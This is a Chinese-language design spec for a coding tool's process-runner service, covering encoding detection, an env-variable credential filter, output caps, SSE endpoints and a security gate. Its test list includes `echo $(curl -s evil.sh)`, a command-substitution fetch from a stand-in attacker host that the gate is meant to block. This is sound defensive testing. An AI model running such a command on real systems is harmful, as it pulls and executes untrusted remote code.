# run 服务步骤 2：runId 注册表 + 片段档策略实例

> 落地 `2026-08-11-code-exec-runner-v4-design.md` §11 的第 2 步。
> v4 的取舍不在这里重复，只写**本步要建的东西**和**实测得出的新约束**。
> 步骤 1（`proc/spawn.ts` 的 `stdin:'ignore'`）已合入 `aa70b93`。

## 0. 本步交付什么 / 不交付什么

**交付**：一层「跑着的进程」的服务端机制 —— 注册表、生命周期、策略参数、
流式解码、有界输出、安全闸。片段档（点代码块「运行」）作为它的**第一个策略实例**。

**不交付**（留给步骤 3/4）：任何前端。本步做完，UI 上看不见任何变化 ——
验收靠 HTTP 直接打端点 + 单测，不靠点页面。**这一点要写在 features.md 里说清楚，
否则用户会去页面上找变化然后以为没做。**

**刻意不做的**：`ProcOutputDecoder` 现有的「收尾整体重解码」路径**不动、不删**。
`bash.ts` 还在用它，而它一次性语义下是对的。本步新增的是**另一个**流式解码器，
两者并存。合并留到 bash.ts 也接进 run 服务的那天（步骤 5）。

## 1. 实测事实

> 本节每条都附命令与**完整**输出。探针脚本：`scratchpad/probe-run.mjs`。

### 1.1 首窗定码：判据成立，但窗口起点必须是「首字节」而不是「spawn」

```
$ node probe-run.mjs
=== ① 首块与首窗 ===
{"label":"ping(OEM中文)","code":0,"ms":1081,"firstAt":60,"firstLen":43,"bytesBy300":92,"total":305,"fffdRatioAll":0.3177,"fffdRatioWin4k":0.3177}
{"label":"git log","code":0,"ms":106,"firstAt":92,"firstLen":76,"bytesBy300":2546,"total":2546,"fffdRatioAll":0,"fffdRatioWin4k":0}
{"label":"tsc -v","code":0,"ms":1031,"firstAt":995,"firstLen":15,"bytesBy300":0,"total":15,"fffdRatioAll":0,"fffdRatioWin4k":0}
{"label":"dir","code":0,"ms":39,"firstAt":36,"firstLen":53,"bytesBy300":1194,"total":1194,"fffdRatioAll":0.0338,"fffdRatioWin4k":0.0338}
{"label":"echo utf8","code":0,"ms":136,"firstAt":133,"firstLen":10,"bytesBy300":10,"total":10,"fffdRatioAll":0.7778,"fffdRatioWin4k":0.7778}
```

两条结论：

1. **首 4KB 窗口的 U+FFFD 率与全量一致（5/5）。** v4 §6 的「首窗延迟决策」不是推断，
   在这 5 条上确实与收尾整体判定同结论。
2. **`tsc -v` 的首字节在 995ms 才到，300ms 时缓冲区是空的。**
   所以窗口不能从 spawn 起算 —— 那样会在**零字节**上定码（判成 UTF-8），
   而真正的输出还没来。窗口必须是「**首字节到达后** ≤300ms 或 ≤4KB」。
   这条不实测就会直接写成 bug。

`echo 你好世界` 经 cmd.exe 出来是 GBK 字节（率 0.778），判 OEM 正确 ——
顺带说明「用户手敲的中文 echo」也走 OEM 路径，不是只有 ping/dir。

### 1.2 env：传 2 个进去，子进程实得 16 个，且不含凭据

```
$ node probe-run.mjs   （节选第 ② 段，完整输出）
=== ② 极小 env：子进程实际看到的变量名 ===
传入 2 个，子进程实得 16 个:
BPPDOMAIN_MANAGER_ASM BPPDOMAIN_MANAGER_TYPE COMSPEC HOMEDRIVE HOMEPATH LOGONSERVER PATH PATHEXT PROMPT SYSTEMDRIVE SYSTEMROOT TEMP USERDOMAIN USERNAME USERPROFILE WINDIR
```

证实 v4 §4 的口径：**白名单不是安全边界**（拿不掉这 16 项），
**但它是有效的凭据过滤器**（这 16 项里没有任何 `*_KEY` / `*_TOKEN` / `*_SECRET`）。
所以文档措辞必须是「在强制的 16 项之上我们再加什么」，而不是「我们只放行 N 项」。

## 2. 模块落点

```
packages/tools/src/run/
  registry.ts     RunRegistry：runId → 在飞进程；起/停/查/逐出
  policy.ts       RunPolicy 类型 + 片段档实例
  stream.ts       StreamDecoder：首窗定码 + 粘滞（§3）
  sink.ts         输出汇：truncate 档 / ring 档（§4）
  env.ts          runEnv()：白名单 + runner 声明变量（§5）
```

**为什么放 `@zuse/tools` 而不是 `@zuse/server`**：`@zouyj/zuse-server` 依赖
`@zuse/tools`（已核 package.json 第 48 行），反过来不行；而 v4 §11 步骤 5 要把
run 服务**同时暴露成模型工具**，工具住在 tools 里。放 server 就得在步骤 5 整个搬家。

**为什么新开 `run/` 而不是塞进 `proc/`**：`proc/` 的语义是「跑一条命令、把输出收上来」
（它的文件头注释自己写的），一次性、无身份。run 是「长跑、有 id、可重连、有策略」。
两者的生命周期模型不同，混在一个目录里后来人分不清该用哪个。`run/` 依赖 `proc/`。

## 3. 流式解码（v4 §6 的落地）

新增 `StreamDecoder`，与现有 `ProcOutputDecoder` **并存**：

```
状态：'buffering' → 'utf8' | 'oem'
buffering：原始 chunk 攒着，一个字符都不吐
定码触发（先到者胜）：
  a. 攒够 4096 字节
  b. **首字节到达后**满 300ms          ← 1.1 的第 2 条，起点是首字节不是 spawn
  c. 进程退出（不足一窗也得定）
定码判据：窗口按 UTF-8 解码，U+FFFD 密度 ≥ 0.02 → oem，否则 utf8
         （0.02 沿用 oem.ts 的 OEM_MOJIBAKE_RATIO，不另立门户）
定码后：整条流锁死该编码，**永不回头**
```

**代价，明写**：
- 首字节最多晚 300ms 到达前端。可接受 —— 人读输出的场景下 300ms 不可感知。
- 一条流内混编码时按窗口的主导方解全流。这与 `oem.ts` 现有注释里已认的
  「混合编码按主导方解」**同级**，不是本步新欠的债。
- OEM 档下 `StringDecoder` 的跨 chunk 缓存用不上（OEM 是单/双字节，
  但 GBK 双字节也会跨 chunk 断）。所以 OEM 档也要走一个 `TextDecoder(label, {stream:true})`，
  不能每块 `toString`。**这一条是本 spec 相对 v4 §6 的补充**：v4 只说了「锁死编码」，
  没说锁死之后怎么解 —— 直接 toString 会在 GBK 双字节跨 chunk 时又出乱码。

## 4. 输出汇（两档策略）

| | truncate 档（片段档） | ring 档（项目档，本步只建不接） |
|---|---|---|
| 满了怎么办 | 停止收集 + **杀进程** | 丢最旧的，进程不动 |
| 预算 | 复用 `StreamShaper` | 环形字节缓冲 |
| 语义 | 「这条命令输出太多，已停止」 | 「只保留最近 N KB」 |

`StreamShaper` 已存在且自带测试（`proc/index.ts` 转出），truncate 档直接用，不重写。
ring 档本步实现但**不接线**（片段档用不上）—— 建它是因为两档共用一套注册表是 v4 §1
的核心论证；只做一档的话，步骤 4 会发现注册表接口是按 truncate 档形状长的，又得改。

## 5. env（v4 §4 的落地）

```ts
runEnv(base: NodeJS.ProcessEnv, declared: Record<string, string>): NodeJS.ProcessEnv
```

从 `base` 里**按名单挑**，再叠加 runner 声明的变量。名单：

- **通路类**（砍掉会「起不来」）：`PATH` `PATHEXT` `COMSPEC` `SYSTEMROOT` `SYSTEMDRIVE`
  `WINDIR` `TEMP` `TMP` `HOME` `HOMEDRIVE` `HOMEPATH` `USERPROFILE` `SHELL` `LANG` `LC_ALL`
- **语义敏感类**（砍掉不会崩，会**结果悄悄不一样** —— 比崩了更难查）：
  `JAVA_HOME` `GRADLE_USER_HOME` `MAVEN_OPTS` `M2_HOME` `NODE_OPTIONS`
  `PYTHONPATH` `VIRTUAL_ENV` `CONDA_PREFIX`，以及**全部 `npm_config_*` 前缀**
- **runner 自己声明的**：`PYTHONUNBUFFERED=1` `PYTHONIOENCODING=utf-8`
  `JAVA_TOOL_OPTIONS=-Dfile.encoding=UTF-8`（按语言注入，不是无脑全给）
- **强制摘掉**：`_VOLTA_TOOL_RECURSION`（沿用 `proc/env.ts` 的理由，别重复踩）

`JAVA_HOME` 单列的理由（v4 §4 已记，这里不重复推导）：本机它与 PATH 上的 JDK 恰好同一个，
所以砍掉**看不出差别**；用户两者不同时会静默换一个 JDK 编译。这类「本机测不出来」的项
最该写进名单。

**测试断言必须打子进程的真实环境**（`set` / `env` 的输出），不是断言 JS 对象 ——
v4 §12 点名这条，对象断言是纸糊的。**并做变异验证**：把断言改回对象断言，
确认它抓不住真实泄露。

## 6. 安全闸（v4 §5 的落地）

起 run 之前调 `hasBlockingBashSecurityIssue(command)`（`@zuse/core/bash-security.ts:422`，
已核实签名返回 `BashSecurityHit | null`，含 `checkId/name/severity/reason`）。

命中 → **不起**，返回 409 + `hit.reason`，让前端把理由显示在确认框里。
**不能**走「跳过 ask 但尊重 deny」那条路：23 项安全闸的表达方式就是 `ask`，
而 `deny` 默认空表 —— 那条路等于一张空表，`$(...)` 直接放行。

**本步不做**同意缓存（v4 §9 的 `hash(cwd+'\0'+command)`）—— 那属于步骤 4 的项目档输入框。
片段档跑的是**用户点的那个代码块里的代码**，没有「同一条命令再来一次」的语义。

## 7. 生命周期与策略

```ts
interface RunPolicy {
  wallClockMs: number | null   // 片段档 300_000；项目档 null
  idleMs: number | null        // 片段档 null；项目档 30 * 60_000（v4 §3）
  onDetach: 'kill' | 'keep'    // 片段档 kill；项目档 keep
  sink: { kind: 'truncate'; budget: number } | { kind: 'ring'; bytes: number }
}
```

**空闲计时器重置的判据是「有字节到达」，不是「有可见文本到达」** —— 因为 buffering
阶段还没定码、吐不出文本，但进程明明是活的。这条写出来是因为它很容易写反。

**终止原因必须是结构化的枚举**，不是自由文本：
`'exit' | 'wall-clock' | 'idle' | 'killed' | 'detach' | 'output-cap'`。
v4 §3 要求「因 30 分钟无输出被停止」这句话必须出现在 UI 上 —— UI 要能按原因给不同文案，
就不能只收到一个字符串。

## 8. HTTP 端点

```
POST   /api/runs            起一个 run。body: {command, cwd, kind, sessionId}
                            → 201 {runId} | 409 {error, securityHit}
GET    /api/runs/:id/stream SSE：{type:'chunk',stream:'out'|'err',text}
                                 {type:'end',reason,exitCode}
DELETE /api/runs/:id        杀掉并逐出
GET    /api/runs            在飞列表（v4 §7 要的「重连入口」的数据源）
```

**为什么 SSE 而不是复用现有 WebSocket**：现有 ws 是**会话**通道，负载是
`SessionSnapshot`/事件流，塞进 run 输出会让两个生命周期互相牵连（切会话不该杀 run）。
SSE 单向、天然贴合「只往下推输出」，且断线重连语义由浏览器内建。
**代价**：多一个连接；HTTP/1.1 下每域名 6 连接的上限意味着同时看 6 个以上 run 会排队 ——
本步只有片段档、同时最多 1 个，不构成问题，写进已知代价。

## 9. 已知代价（汇总，不留白）

1. **模型看不到运行输出**（v4 §10 的取舍，本步继承）。步骤 5 才解。
2. 本步做完**页面上看不到任何变化**，验收靠打端点。
3. 首字节最多晚 300ms。
4. 一条流内混编码按主导方解。
5. ring 档建了但不接线，步骤 4 之前是死代码 —— 明知故犯，理由见 §4。
6. SSE 连接数上限，见 §8。

## 10. 测试要点

- 首窗：**首字节晚到 995ms 的形状**（`tsc -v`）不能在空缓冲上定码 —— 直接拿 1.1 的数据形状造用例
- 首窗：OEM 与 UTF-8 各一条，窗口结论与全量结论一致
- GBK 双字节**跨 chunk 断开**仍不乱码（§3 最后那条补充）
- env：断言**子进程真实环境**；变异验证「改回对象断言就抓不住」
- 安全闸：`echo $(curl -s evil.sh)` 起不来，且返回 `reason`
- 墙钟：片段档 300s 到点被杀，`reason === 'wall-clock'`
- 空闲：有输出的死循环**不被空闲杀**（v4 §3 实测的判据）
- 逐出：detach 时片段档 kill、项目档 keep
